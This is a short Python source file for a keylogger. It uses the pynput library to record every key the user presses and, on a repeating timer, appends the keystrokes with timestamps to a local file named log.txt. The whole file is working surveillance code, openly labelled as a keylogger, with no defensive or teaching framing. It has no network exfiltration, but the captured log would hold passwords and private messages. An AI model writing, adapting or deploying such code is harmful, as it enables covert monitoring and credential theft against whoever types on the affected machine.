from datetime import datetime
from pynput import keyboard
from threading import Timer
from datetime import datetime
from time import sleep



class Keylogger:
    def __init__(self,interval):
        self.interval = interval
        self.log = ""

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        sleep(10)
        self.writeLog()

    def on_press(self, key):
        specialKeys = {"Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "", "Key.tabNone" : "", "Key.enter": "enter" }
        try:
            self.log += str(key.char)
        except AttributeError:
            if str(key) in specialKeys:
                # print(str(key))
                self.log += specialKeys[str(key)]
            else:
                self.log += " "
                self.log += str(key)
                self.log += " "
        self.log += ""

    def writeLog(self):
        now = datetime.now()
        currentTime = now.strftime("%d/%m/%Y %H:%M:%S")
        logC = currentTime + " - "
        logC += self.log
        f = open("log.txt","a")
        f.write(logC)
        f.write("\n")
        self.log = ""
        timer = Timer(interval=self.interval, function=self.writeLog)
        # timer.daemon = True
        timer.start()


def main():
    keylogger = Keylogger(10)
    keylogger.start()


if __name__=='__main__':
    main()